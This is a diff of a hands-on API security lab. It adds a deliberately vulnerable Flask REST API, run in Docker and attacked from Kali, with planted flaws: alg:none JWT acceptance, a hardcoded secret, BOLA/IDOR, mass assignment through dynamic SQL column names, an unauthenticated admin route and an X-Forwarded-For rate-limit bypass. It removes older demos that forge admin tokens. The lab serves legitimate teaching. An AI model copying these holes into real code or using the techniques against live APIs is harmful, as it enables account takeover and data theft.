@@ -1,687 +1,732 @@
 # Lab 12: API Security Testing
 
 ## Objective
-Identify and exploit API security vulnerabilities: JWT algorithm confusion (alg:none attack), BOLA/IDOR in REST endpoints, missing authentication on internal routes, mass assignment, API rate limiting bypass, and GraphQL introspection abuse — then implement a hardened API with proper authentication and rate limiting.
+
+Attack a live REST API from Kali Linux using the OWASP API Security Top 10. You will:
+
+1. **BOLA/IDOR** — access any user's orders and profile by changing the ID in the URL
+2. **JWT alg:none** — forge an admin token with no secret needed
+3. **Mass Assignment** — escalate your own role from `user` to `admin` by sending extra fields
+4. **Excessive Data Exposure** — read internal cost prices and supplier secrets from a public endpoint
+5. **Broken Function Level Authorization** — access an unauthenticated internal admin endpoint
+6. **Rate Limit Bypass** — defeat IP-based rate limiting with a spoofed `X-Forwarded-For` header
+
+Every attack runs from **Kali against a live Flask API** — no simulation, all real HTTP responses.
+
+---
 
 ## Background
-APIs are the backbone of modern applications — and the fastest-growing attack surface. The **OWASP API Security Top 10** (2023) covers threats specific to APIs that the original Top 10 misses: BOLA (Broken Object Level Authorisation) is the #1 API vulnerability, present in virtually every large API. JWT (JSON Web Token) vulnerabilities — including the `alg:none` attack — have been found in production at Auth0, Amazon Cognito, and many others.
+
+The **OWASP API Security Top 10** (2023) was created because APIs fail in ways the classic OWASP Top 10 doesn't fully capture. REST APIs are attacked differently from web pages — there is no browser enforcing same-origin, no HTML form to inspect, and the API's own documentation often maps the attack surface.
+
+**Why APIs are the fastest-growing attack surface:**
+- Mobile apps embed API tokens in binaries — extractable with a hex editor
+- API versioning (`/api/v1/`, `/api/v2/`) means old broken endpoints stay live
+- Developers return full ORM objects, leaking fields never meant to be public
+- Rate limiting on IPs is trivially bypassed with `X-Forwarded-For` headers
+
+**Real-world examples:**
+- **Venmo (2019)** — `/transactions` endpoint was public; 200M transactions scraped showing who paid who for what. BOLA.
+- **Peloton (2021)** — `/api/user/{userId}` returned private data including location, age, weight for any user ID. BOLA.
+- **T-Mobile (2023)** — API returned all account data including SIM card details with no auth. Broken function-level authorization.
+- **JWT alg:none** — Exploited in Auth0, AWS Cognito, and multiple Node.js apps using the `jsonwebtoken` library before v9.
+
+---
+
+## Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                     Docker Network: lab-a12                         │
+│                                                                     │
+│  ┌──────────────────────┐         HTTP requests                    │
+│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
+│  │  innozverse-kali     │                                           │
+│  │                      │  ◀──────── API responses ───────────────  │
+│  │  Tools:              │                                           │
+│  │  • curl              │  ┌────────────────────────────────────┐  │
+│  │  • python3           │  │         VICTIM API SERVER          │  │
+│  │  • nmap              │  │   zchencow/innozverse-cybersec     │  │
+│  │  • gobuster          │  │                                    │  │
+│  └──────────────────────┘  │  Flask REST API :5000              │  │
+│                             │  SQLite: users, orders, products   │  │
+│                             │  JWT auth (vulnerable to alg:none) │  │
+│                             └────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────────────┘
+```
 
 ## Time
-40 minutes
+50 minutes
 
 ## Prerequisites
-- Lab 07 (A07 Authentication Failures) — JWT basics
+- Docker installed and running
+- Lab 10 or 11 completed (familiarity with the two-container setup)
 
 ## Tools
-- Docker: `zchencow/innozverse-cybersec:latest`
+| Tool | Container | Purpose |
+|------|-----------|---------|
+| `curl` | Kali | Send HTTP requests, exploit all API endpoints |
+| `python3` | Kali | Craft JWT forgeries, automate BOLA enumeration |
+| `nmap` | Kali | Port and service fingerprinting |
+| `gobuster` | Kali | Enumerate API endpoints and routes |
 
 ---
 
 ## Lab Instructions
 
-### Step 1: JWT Vulnerabilities — Algorithm Confusion
+### Step 1: Environment Setup — Launch the Vulnerable API
+
+The victim runs a REST API with 3 users (`admin`, `alice`, `bob`) and multiple endpoints that are vulnerable to different OWASP API Top 10 issues.
 
 ```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import base64, json, hmac, hashlib, secrets
+docker network create lab-a12
 
-def b64url_encode(data: bytes) -> str:
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+cat > /tmp/victim_a12.py << 'PYEOF'
+from flask import Flask, request, jsonify
+import sqlite3, base64, hmac, hashlib, json, time
 
-def b64url_decode(s: str) -> bytes:
+app = Flask(__name__)
+JWT_SECRET = "secret123"
+DB = '/tmp/shop_a12.db'
+RATE = {}
+
+with sqlite3.connect(DB) as db:
+    db.executescript("""
+        CREATE TABLE IF NOT EXISTS users    (id INTEGER PRIMARY KEY, username TEXT, email TEXT, role TEXT, api_key TEXT);
+        CREATE TABLE IF NOT EXISTS orders   (id INTEGER PRIMARY KEY, user_id INTEGER, product TEXT, amount REAL, notes TEXT);
+        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, cost REAL, supplier_secret TEXT);
+        INSERT OR IGNORE INTO users VALUES
+            (1,'admin','admin@innozverse.com','admin','key_admin_secret_xyz'),
+            (2,'alice','alice@corp.com','user','key_alice_abc123'),
+            (3,'bob','bob@email.com','user','key_bob_def456');
+        INSERT OR IGNORE INTO orders VALUES
+            (1,2,'Surface Pro 12',864.00,'ship to alice home'),
+            (2,3,'Surface Pen',49.99,'gift wrap'),
+            (3,1,'Surface Laptop 5',1299.00,'admin test order');
+        INSERT OR IGNORE INTO products VALUES
+            (1,'Surface Pro 12',864.00,420.00,'SUPPLIER-SECRET-A'),
+            (2,'Surface Laptop 5',1299.00,650.00,'SUPPLIER-SECRET-B'),
+            (3,'Surface Pen',49.99,8.00,'SUPPLIER-SECRET-C');
+    """)
+
+def b64url(b):
+    if isinstance(b, str): b = b.encode()
+    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+def b64url_dec(s):
     s += '=' * (-len(s) % 4)
     return base64.urlsafe_b64decode(s)
 
-# --- Legitimate JWT creation ---
-SECRET = secrets.token_bytes(32)
+def make_jwt(payload):
+    h = b64url(json.dumps({"alg":"HS256","typ":"JWT"}))
+    p = b64url(json.dumps(payload))
+    sig = b64url(hmac.new(JWT_SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
+    return f"{h}.{p}.{sig}"
 
-def create_jwt(payload: dict) -> str:
-    header = {'alg': 'HS256', 'typ': 'JWT'}
-    h = b64url_encode(json.dumps(header).encode())
-    p = b64url_encode(json.dumps(payload).encode())
-    sig = hmac.new(SECRET, f'{h}.{p}'.encode(), hashlib.sha256).digest()
-    return f'{h}.{p}.{b64url_encode(sig)}'
+def verify_jwt(token):
+    try:
+        h_b64, p_b64, sig = token.split('.')
+        header  = json.loads(b64url_dec(h_b64))
+        payload = json.loads(b64url_dec(p_b64))
+        alg = header.get('alg','').lower()
+        if alg == 'none':
+            return payload          # BUG: accepts unsigned tokens!
+        if alg == 'hs256':
+            exp = b64url(hmac.new(JWT_SECRET.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest())
+            return payload if sig == exp else None
+    except: pass
+    return None
 
-def verify_jwt_vulnerable(token: str) -> dict:
-    '''VULNERABLE: trusts the alg header from the token itself.'''
-    parts = token.split('.')
-    if len(parts) != 3: raise ValueError('Invalid JWT')
-    header  = json.loads(b64url_decode(parts[0]))
-    payload = json.loads(b64url_decode(parts[1]))
-    alg = header.get('alg', 'HS256')
-    
-    if alg == 'none':
-        # VULN: accepts unsigned tokens!
-        print(f'  [VULN] alg=none accepted — no signature check!')
-        return payload
-    elif alg == 'HS256':
-        sig = b64url_decode(parts[2])
-        expected = hmac.new(SECRET, f'{parts[0]}.{parts[1]}'.encode(), hashlib.sha256).digest()
-        if not hmac.compare_digest(sig, expected):
-            raise ValueError('Invalid signature')
-        return payload
-    raise ValueError(f'Unknown algorithm: {alg}')
+@app.route('/')
+def index():
+    return jsonify({'app':'InnoZverse API v2','version':'2.3.1'})
 
-def verify_jwt_safe(token: str) -> dict:
-    '''SAFE: ignores alg header, always uses HS256.'''
-    parts = token.split('.')
-    if len(parts) != 3: raise ValueError('Invalid JWT')
-    sig = b64url_decode(parts[2])
-    expected = hmac.new(SECRET, f'{parts[0]}.{parts[1]}'.encode(), hashlib.sha256).digest()
-    if not hmac.compare_digest(sig, expected):
-        raise ValueError('Invalid signature — token rejected')
-    return json.loads(b64url_decode(parts[1]))
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.get_json() or {}
+    u, p = data.get('username',''), data.get('password','')
+    creds = {'admin':'admin','alice':'alice123','bob':'bob123'}
+    if creds.get(u) == p:
+        ids   = {'admin':1,'alice':2,'bob':3}
+        roles = {'admin':'admin','alice':'user','bob':'user'}
+        return jsonify({'token': make_jwt({'user_id':ids[u],'username':u,'role':roles[u]})})
+    return jsonify({'error':'Invalid credentials'}), 401
 
-# Create legitimate token
-legit_payload = {'sub': 'user-42', 'role': 'customer', 'exp': 9999999999}
-legit_token = create_jwt(legit_payload)
-print('=== JWT Algorithm Confusion Attack ===')
-print(f'Legitimate token: {legit_token[:60]}...')
-print()
+@app.route('/api/orders/<int:order_id>')
+def get_order(order_id):
+    token = request.headers.get('Authorization','').replace('Bearer ','')
+    payload = verify_jwt(token)
+    if not payload: return jsonify({'error':'Unauthorized'}), 401
+    # BUG: checks token valid but NOT that order belongs to this user
+    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
+    order = db.execute('SELECT * FROM orders WHERE id=?',(order_id,)).fetchone()
+    return jsonify(dict(order)) if order else (jsonify({'error':'Not found'}), 404)
 
-# alg:none attack — forge admin token with no signature
-forged_header  = b64url_encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())
-forged_payload = b64url_encode(json.dumps({'sub': 'user-42', 'role': 'admin', 'exp': 9999999999}).encode())
-forged_token   = f'{forged_header}.{forged_payload}.'  # empty signature
+@app.route('/api/users/<int:user_id>')
+def get_user(user_id):
+    token = request.headers.get('Authorization','').replace('Bearer ','')
+    payload = verify_jwt(token)
+    if not payload: return jsonify({'error':'Unauthorized'}), 401
+    # BUG: no check that user_id == payload['user_id']
+    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
+    user = db.execute('SELECT * FROM users WHERE id=?',(user_id,)).fetchone()
+    return jsonify(dict(user)) if user else (jsonify({'error':'Not found'}), 404)
 
-print(f'Forged token (alg:none, role=admin): {forged_token[:60]}...')
-print()
+@app.route('/api/users/<int:user_id>/update', methods=['POST'])
+def update_user(user_id):
+    token = request.headers.get('Authorization','').replace('Bearer ','')
+    payload = verify_jwt(token)
+    if not payload: return jsonify({'error':'Unauthorized'}), 401
+    data = request.get_json() or {}
+    db = sqlite3.connect(DB)
+    # BUG: updates any fields including 'role' — mass assignment
+    for field, value in data.items():
+        try: db.execute(f'UPDATE users SET {field}=? WHERE id=?',(value, user_id))
+        except: pass
+    db.commit()
+    db.row_factory = sqlite3.Row
+    updated = db.execute('SELECT * FROM users WHERE id=?',(user_id,)).fetchone()
+    return jsonify(dict(updated))
 
-print('[VULNERABLE] Server trusts alg header:')
-try:
-    result = verify_jwt_vulnerable(forged_token)
-    print(f'  Accepted! Payload: {result}')
-    print(f'  Attacker is now: {result[\"role\"]}')
-except Exception as e:
-    print(f'  Rejected: {e}')
+@app.route('/api/products')
+def products():
+    # BUG: returns internal cost and supplier_secret — excessive data exposure
+    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
+    return jsonify([dict(r) for r in db.execute('SELECT * FROM products').fetchall()])
 
-print()
-print('[SAFE] Server ignores alg header:')
-try:
-    result = verify_jwt_safe(forged_token)
-    print(f'  Accepted: {result}')
-except Exception as e:
-    print(f'  Rejected: {e}')
+@app.route('/api/internal/users')
+def internal_users():
+    # BUG: no authentication required
+    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
+    return jsonify([dict(r) for r in db.execute('SELECT * FROM users').fetchall()])
 
-# Also test RS256→HS256 confusion (public key used as HMAC secret)
-print()
-print('Other JWT attack vectors:')
-attacks = [
-    ('alg:none',      'Remove signature — server accepts unsigned tokens'),
-    ('RS256→HS256',   'Server uses public key as HMAC secret — forge with known public key'),
-    ('Key confusion', 'kid (key ID) header injection to control which key is used'),
-    ('exp bypass',    'Modify exp claim if signature not verified'),
-    ('jwk injection', 'Embed attacker-controlled JWK in header as trusted key'),
-]
-for name, desc in attacks:
-    print(f'  [{name}] {desc}')
-"
+@app.route('/api/search')
+def search():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    now = time.time()
+    RATE[ip] = [t for t in RATE.get(ip,[]) if now - t < 10]
+    if len(RATE[ip]) >= 5:
+        return jsonify({'error':'Rate limited — try again later'}), 429
+    RATE[ip].append(now)
+    q = request.args.get('q','')
+    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
+    rows = db.execute("SELECT id,name,price FROM products WHERE name LIKE ?", (f'%{q}%',)).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
+PYEOF
+
+docker run -d \
+  --name victim-a12 \
+  --network lab-a12 \
+  -v /tmp/victim_a12.py:/app/victim.py:ro \
+  zchencow/innozverse-cybersec:latest \
+  python3 /app/victim.py
+
+sleep 4
+
+VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a12.IPAddress}}' victim-a12)
+echo "Victim IP: $VICTIM_IP"
+curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
 ```
 
 **📸 Verified Output:**
-```
-Forged token (alg:none, role=admin): eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0...
-
-[VULNERABLE] Server trusts alg header:
-  [VULN] alg=none accepted — no signature check!
-  Accepted! Payload: {'sub': 'user-42', 'role': 'admin', 'exp': 9999999999}
-  Attacker is now: admin
-
-[SAFE] Server ignores alg header:
-  Rejected: Invalid signature — token rejected
-```
-
-> 💡 **Never trust the `alg` field from the token itself.** The algorithm must be configured server-side. A library that says "I'll use whatever algorithm the token requests" is fundamentally broken. When using JWT libraries, explicitly specify the algorithm: `jwt.decode(token, secret, algorithms=['HS256'])` — note the plural `algorithms` parameter in PyJWT forces you to specify it.
-
-### Step 2: BOLA — Broken Object Level Authorisation
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import secrets
-
-print('=== BOLA — Broken Object Level Authorisation (OWASP API #1) ===')
-print()
-
-# Simulated database
-orders = {
-    'ORD-001': {'user_id': 'user-42', 'product': 'Surface Pro 12',  'amount': 864.00, 'card_last4': '4242'},
-    'ORD-002': {'user_id': 'user-99', 'product': 'Surface Laptop 5', 'amount': 1299.00,'card_last4': '1234'},
-    'ORD-003': {'user_id': 'user-42', 'product': 'Surface Pen',      'amount': 49.99,  'card_last4': '4242'},
-    'ORD-004': {'user_id': 'user-77', 'product': 'Office 365',       'amount': 99.99,  'card_last4': '5678'},
-}
-
-# VULNERABLE: No ownership check
-def get_order_vulnerable(order_id: str, requesting_user: str) -> dict:
-    order = orders.get(order_id)
-    if not order:
-        return {'error': 'Not found'}
-    return order  # Returns ANY order regardless of owner!
-
-# SAFE: Ownership verification
-def get_order_safe(order_id: str, requesting_user: str) -> dict:
-    order = orders.get(order_id)
-    if not order:
-        return {'error': 'Not found'}
-    if order['user_id'] != requesting_user:
-        return {'error': 'Forbidden'}  # Same error as not found (no enumeration)
-    return order
-
-attacker = 'user-42'  # logged in as user-42
-target_order = 'ORD-002'  # belongs to user-99
-
-print(f'Attacker: {attacker}')
-print(f'Target order: {target_order} (belongs to user-99)')
-print()
-
-print('[VULNERABLE] GET /api/v1/orders/ORD-002:')
-result = get_order_vulnerable(target_order, attacker)
-print(f'  Response: {result}')
-print(f'  Card leaked: ***{result[\"card_last4\"]}')
-print(f'  Attacker can enumerate ALL orders by incrementing IDs!')
-
-print()
-print('[SAFE] GET /api/v1/orders/ORD-002:')
-result2 = get_order_safe(target_order, attacker)
-print(f'  Response: {result2}')
-
-print()
-print('BOLA impact scale:')
-print('  Attacker script: for order_id in range(1, 10000000):')
-print('    GET /api/orders/{order_id}')
-print('    → Exfiltrates all customer orders, PII, payment data')
-print()
-print('BOLA prevention checklist:')
-checks = [
-    'Verify object ownership on EVERY request (not just at login)',
-    'Use UUIDs instead of sequential IDs (reduces enumeration surface)',
-    'Implement row-level security in database (PostgreSQL RLS)',
-    'Log all access attempts with user_id + resource_id',
-    'Rate limit enumerable endpoints',
-    'Never return 403 vs 404 differently (prevents existence confirmation)',
-]
-for c in checks:
-    print(f'  [✓] {c}')
-"
-```
-
-**📸 Verified Output:**
-```
-[VULNERABLE] GET /api/v1/orders/ORD-002:
-  Response: {'user_id': 'user-99', 'product': 'Surface Laptop 5', 'amount': 1299.0, 'card_last4': '1234'}
-  Card leaked: ***1234
-  Attacker can enumerate ALL orders by incrementing IDs!
-
-[SAFE] GET /api/v1/orders/ORD-002:
-  Response: {'error': 'Forbidden'}
-```
-
-### Step 3: Mass Assignment
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== Mass Assignment Vulnerability ===')
-print()
-
-# Simulated user model
-class UserModelVulnerable:
-    FIELDS = ['username', 'email', 'password', 'role', 'is_admin',
-              'account_balance', 'plan', 'verified', 'created_at']
-
-    def update(self, user_id: str, data: dict) -> dict:
-        '''VULNERABLE: blindly applies all fields from request body.'''
-        user = {'id': user_id, 'username': 'alice', 'email': 'alice@corp.com',
-                'role': 'customer', 'is_admin': False, 'account_balance': 0.0}
-        for key, value in data.items():
-            if key in self.FIELDS:
-                user[key] = value   # No field filtering!
-        return user
-
-class UserModelSafe:
-    ALLOWED_UPDATE_FIELDS = {'username', 'email', 'password'}  # explicit allowlist
-
-    def update(self, user_id: str, data: dict) -> dict:
-        '''SAFE: only allows updating explicitly permitted fields.'''
-        user = {'id': user_id, 'username': 'alice', 'email': 'alice@corp.com',
-                'role': 'customer', 'is_admin': False, 'account_balance': 0.0}
-        rejected = []
-        for key, value in data.items():
-            if key in self.ALLOWED_UPDATE_FIELDS:
-                user[key] = value
-            else:
-                rejected.append(key)
-        if rejected:
-            print(f'  [SAFE] Rejected fields: {rejected}')
-        return user
-
-# Legitimate update
-legit_update = {'username': 'alice2024', 'email': 'alice2024@corp.com'}
-
-# Malicious mass assignment attack
-malicious_update = {
-    'username': 'alice2024',
-    'email': 'alice2024@corp.com',
-    'role': 'admin',           # privilege escalation!
-    'is_admin': True,          # privilege escalation!
-    'account_balance': 99999.99,  # financial fraud!
-    'verified': True,          # bypass email verification
-}
-
-print('[VULNERABLE] PATCH /api/v1/users/me with malicious payload:')
-result = UserModelVulnerable().update('user-42', malicious_update)
-print(f'  role: {result[\"role\"]} (was: customer)')
-print(f'  is_admin: {result[\"is_admin\"]} (was: False)')
-print(f'  account_balance: \${result[\"account_balance\"]} (was: \$0.00)')
-print(f'  IMPACT: Full account takeover + financial fraud!')
-
-print()
-print('[SAFE] PATCH /api/v1/users/me with malicious payload:')
-result2 = UserModelSafe().update('user-42', malicious_update)
-print(f'  role: {result2[\"role\"]} (unchanged)')
-print(f'  is_admin: {result2[\"is_admin\"]} (unchanged)')
-print(f'  account_balance: \${result2[\"account_balance\"]} (unchanged)')
-
-print()
-print('Mass assignment in real frameworks:')
-examples = [
-    ('Rails',  'User.update(params[:user])  ← vulnerable; use strong_parameters'),
-    ('Django', 'form.save() with all fields ← use fields= or exclude= in ModelForm'),
-    ('Spring', '@RequestBody User user      ← use DTOs, not entity classes directly'),
-    ('Node',   'Object.assign(user, req.body) ← validate/filter req.body first'),
-]
-for fw, example in examples:
-    print(f'  [{fw}] {example}')
-"
-```
-
-**📸 Verified Output:**
-```
-[VULNERABLE] PATCH /api/v1/users/me:
-  role: admin (was: customer)
-  is_admin: True (was: False)
-  account_balance: $99999.99 (was: $0.00)
-  IMPACT: Full account takeover + financial fraud!
-
-[SAFE] PATCH /api/v1/users/me:
-  [SAFE] Rejected fields: ['role', 'is_admin', 'account_balance', 'verified']
-  role: customer (unchanged)
-```
-
-### Step 4: API Rate Limiting & Throttling
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import time
-
-print('=== API Rate Limiting ===')
-print()
-
-call_store = {}
-
-def rate_limit(api_key: str, endpoint: str, limit: int = 10, window: int = 60) -> tuple:
-    '''Token bucket rate limiter per API key + endpoint.'''
-    now = int(time.time())
-    bucket_key = f'{api_key}:{endpoint}'
-    timestamps = call_store.get(bucket_key, [])
-    # Sliding window: keep only timestamps within current window
-    timestamps = [t for t in timestamps if now - t < window]
-    if len(timestamps) >= limit:
-        reset_in = window - (now - timestamps[0])
-        return False, 429, {
-            'error': 'Rate limit exceeded',
-            'limit': limit,
-            'window': f'{window}s',
-            'reset_in': f'{reset_in}s',
-            'retry_after': reset_in,
-        }
-    timestamps.append(now)
-    call_store[bucket_key] = timestamps
-    remaining = limit - len(timestamps)
-    return True, 200, {'X-RateLimit-Remaining': remaining, 'X-RateLimit-Limit': limit}
-
-# Different limits per endpoint type
-endpoint_limits = {
-    '/api/v1/auth/login':           (5,  900),   # 5 per 15 minutes
-    '/api/v1/auth/reset-password':  (3,  3600),  # 3 per hour
-    '/api/v1/products':             (100, 60),   # 100 per minute
-    '/api/v1/orders':               (30,  60),   # 30 per minute
-    '/api/v1/admin/':               (20,  60),   # 20 per minute
-}
-
-print('Rate Limit Configuration:')
-for endpoint, (limit, window) in endpoint_limits.items():
-    print(f'  {endpoint:<40} {limit} req/{window}s')
-
-print()
-print('Simulating API abuse (brute-force login):')
-for i in range(7):
-    limit, window = endpoint_limits['/api/v1/auth/login']
-    ok, status, resp = rate_limit('attacker-key', '/api/v1/auth/login', limit, window)
-    if ok:
-        print(f'  Request {i+1}: {status} OK (remaining: {resp[\"X-RateLimit-Remaining\"]})')
-    else:
-        print(f'  Request {i+1}: {status} BLOCKED — {resp[\"error\"]} (reset in {resp[\"reset_in\"]})')
-
-print()
-print('Rate limiting response headers:')
-headers = {
-    'X-RateLimit-Limit':     '100',
-    'X-RateLimit-Remaining': '87',
-    'X-RateLimit-Reset':     '1709510400',
-    'Retry-After':           '43',
-}
-for h, v in headers.items():
-    print(f'  {h}: {v}')
-
-print()
-print('Rate limiting bypass techniques:')
-bypasses = [
-    ('IP rotation',      'Use proxy pool — rate limit per IP', 'Use API key + IP together'),
-    ('Header spoofing',  'X-Forwarded-For: different IPs each request', 'Never trust X-Forwarded-For for rate limiting'),
-    ('Null byte',        'Append %00 to endpoint URL path', 'Normalise URLs before rate limit check'),
-    ('Distributed',      'Many accounts each under threshold', 'Global rate limit per user, not per IP'),
-]
-for name, technique, defence in bypasses:
-    print(f'  [{name}] Attack: {technique}')
-    print(f'           Defence: {defence}')
-"
-```
-
-**📸 Verified Output:**
-```
-Rate Limit Configuration:
-  /api/v1/auth/login          5 req/900s
-  /api/v1/auth/reset-password 3 req/3600s
-
-Simulating API abuse:
-  Request 1: 200 OK (remaining: 4)
-  Request 2: 200 OK (remaining: 3)
-  Request 5: 200 OK (remaining: 0)
-  Request 6: 429 BLOCKED — Rate limit exceeded (reset in 900s)
-```
-
-### Step 5: Sensitive Data Exposure in API Responses
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import re
-
-print('=== API Response — Data Overexposure ===')
-print()
-
-# VULNERABLE: Returns full user object from DB
-def get_user_vulnerable(user_id):
-    return {
-        'id': user_id,
-        'username': 'alice',
-        'email': 'alice@corp.com',
-        'password_hash': '\$2b\$12\$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy',
-        'ssn': '123-45-6789',
-        'credit_card': '4532-1234-5678-9012',
-        'cvv': '421',
-        'date_of_birth': '1990-05-15',
-        'internal_notes': 'High-value customer, flagged for fraud review',
-        'admin_level': 0,
-        'totp_secret': 'JBSWY3DPEHPK3PXP',
-        'reset_token': 'abc123def456',
-        'login_attempts': 3,
-        'is_banned': False,
-        'stripe_customer_id': 'cus_abc123',
-    }
-
-# SAFE: Returns only fields needed by client
-def get_user_safe(user_id):
-    full = get_user_vulnerable(user_id)  # Fetch from DB
-    return {
-        'id':       full['id'],
-        'username': full['username'],
-        'email':    full['email'],
-        # Never return: password_hash, ssn, cvv, totp_secret, reset_token, internal_notes
-    }
-
-print('[VULNERABLE] GET /api/v1/users/me — full DB record returned:')
-vuln = get_user_vulnerable('user-42')
-for k, v in vuln.items():
-    risk = '[CRITICAL]' if k in ['password_hash','ssn','credit_card','cvv','totp_secret','reset_token'] else \
-           '[HIGH]'     if k in ['date_of_birth','internal_notes','stripe_customer_id'] else '[OK]'
-    print(f'  {risk} {k}: {v}')
-
-print()
-print('[SAFE] GET /api/v1/users/me — minimal response:')
-safe = get_user_safe('user-42')
-for k, v in safe.items():
-    print(f'  [OK] {k}: {v}')
-
-print()
-print('OWASP API #3: Excessive Data Exposure — prevalence: very widespread')
-print('Pattern: Developer returns entire DB model, relies on client to filter')
-print('Reality: All fields are in the JSON response — accessible to any attacker')
-print()
-print('Prevention:')
-print('  1. Define explicit response schemas (Pydantic, marshmallow, OpenAPI)')
-print('  2. Code review API responses for sensitive field leakage')
-print('  3. Automated scanning: check all API responses for PII patterns')
-print('  4. Data classification: tag sensitive fields in models')
-"
-```
-
-**📸 Verified Output:**
-```
-[VULNERABLE] GET /api/v1/users/me:
-  [CRITICAL] password_hash: $2b$12$N9qo8uLOi...
-  [CRITICAL] ssn: 123-45-6789
-  [CRITICAL] credit_card: 4532-1234-5678-9012
-  [CRITICAL] totp_secret: JBSWY3DPEHPK3PXP
-  [CRITICAL] reset_token: abc123def456
-
-[SAFE] GET /api/v1/users/me:
-  [OK] id: user-42
-  [OK] username: alice
-  [OK] email: alice@corp.com
-```
-
-> 💡 **API response filtering must happen server-side.** Some developers return the full object and add a comment in JavaScript "only show these fields to the user." The client-side filtering is meaningless — all fields are in the HTTP response body, visible to browser dev tools, Burp Suite, or curl. Server-side schema enforcement (Pydantic's `response_model` in FastAPI, DRF serializers) is the correct approach.
-
-### Step 6: Missing Function Level Authorisation
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== Missing Function Level Authorisation (OWASP API #5) ===')
-print()
-
-# API endpoint inventory — some admin endpoints exist but are 'hidden'
-api_endpoints = [
-    # Public endpoints
-    ('GET',    '/api/v1/products',          'all',      True),
-    ('GET',    '/api/v1/products/{id}',     'all',      True),
-    ('POST',   '/api/v1/orders',            'customer', True),
-    ('GET',    '/api/v1/orders/{id}',       'customer', True),
-
-    # Admin endpoints — documented as 'internal' but still HTTP accessible
-    ('GET',    '/api/v1/admin/users',       'admin',    False),  # No auth check!
-    ('DELETE', '/api/v1/admin/users/{id}',  'admin',    False),  # No auth check!
-    ('GET',    '/api/v1/admin/revenue',     'admin',    False),  # No auth check!
-    ('POST',   '/api/v1/admin/refund',      'admin',    False),  # No auth check!
-    ('GET',    '/api/v1/debug/config',      'admin',    False),  # Exists in prod!
-    ('GET',    '/api/v1/internal/health',   'admin',    True),   # Properly secured
-]
-
-print(f'  {\"Method\":<8} {\"Endpoint\":<40} {\"Required Role\":<12} {\"Secured?\":<10} {\"Risk\"}')
-for method, path, role, secured in api_endpoints:
-    icon = '✓' if secured else '✗ EXPOSED'
-    risk = 'CRITICAL' if not secured and role == 'admin' else 'OK'
-    print(f'  {method:<8} {path:<40} {role:<12} {icon:<10} {risk}')
-
-print()
-print('Attack: enumerate admin endpoints via wordlist + HTTP verbs')
-print('Target: GET /api/v1/admin/users → returns all user data without auth')
-print()
-
-# Secure implementation
-print('Secure implementation (decorator pattern):')
-print('''
-  def require_role(*roles):
-      def decorator(f):
-          def wrapper(*args, **kwargs):
-              token = get_current_token()
-              if token[\"role\"] not in roles:
-                  return {\"error\": \"Forbidden\"}, 403
-              return f(*args, **kwargs)
-          return wrapper
-      return decorator
-
-  @app.route(\"/api/v1/admin/users\")
-  @require_role(\"admin\", \"super_admin\")   # Explicit role check on EVERY route
-  def list_users():
-      return get_all_users()
-''')
-"
-```
-
-### Step 7: GraphQL Security
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import json
-
-print('=== GraphQL Security Issues ===')
-print()
-
-print('[Issue 1] Introspection — exposes entire schema')
-introspection_query = '''
+```json
 {
-  __schema {
-    types {
-      name
-      fields {
-        name
-        type { name }
-      }
-    }
-  }
-}'''
-print(f'  Introspection query: {introspection_query.strip()[:100]}...')
-print('  Response reveals: ALL types, ALL fields, ALL mutations, ALL queries')
-print('  Attack: Find hidden admin mutations, sensitive fields, internal types')
-print()
-
-print('[Issue 2] Batching attack (rate limit bypass)')
-batch_query = json.dumps([
-    {'query': 'mutation { login(email: \"admin\", password: \"pass1\") { token } }'},
-    {'query': 'mutation { login(email: \"admin\", password: \"pass2\") { token } }'},
-    {'query': 'mutation { login(email: \"admin\", password: \"pass3\") { token } }'},
-])
-print(f'  Batch: {batch_query[:100]}...')
-print('  One HTTP request = 100 login attempts → bypasses rate limiter!')
-print()
-
-print('[Issue 3] Deeply nested queries (DoS)')
-nested = '{ user { orders { items { product { reviews { author { orders { items { product }}}}}}}}}}'
-print(f'  Nested query: {nested}')
-print('  Database: 8 JOINs per request, exponential data fetching = DoS')
-print()
-
-print('GraphQL security controls:')
-controls = [
-    ('Disable introspection in production', 'graphene: introspection=False'),
-    ('Query depth limiting', 'Max depth 5 — reject deeper queries'),
-    ('Query complexity scoring', 'Reject queries with complexity > 100'),
-    ('Per-operation rate limiting', 'Rate limit per mutation type, not just per IP'),
-    ('Field-level authorisation', 'Check permissions per field, not just per query'),
-    ('Disable batching', 'Or limit batch size to 5'),
-    ('Persisted queries', 'Only allow pre-approved query hashes'),
-]
-for control, impl in controls:
-    print(f'  [✓] {control:<40} → {impl}')
-"
-```
-
-**📸 Verified Output:**
-```
-[Issue 1] Introspection
-  Response reveals: ALL types, ALL fields, ALL mutations, ALL queries
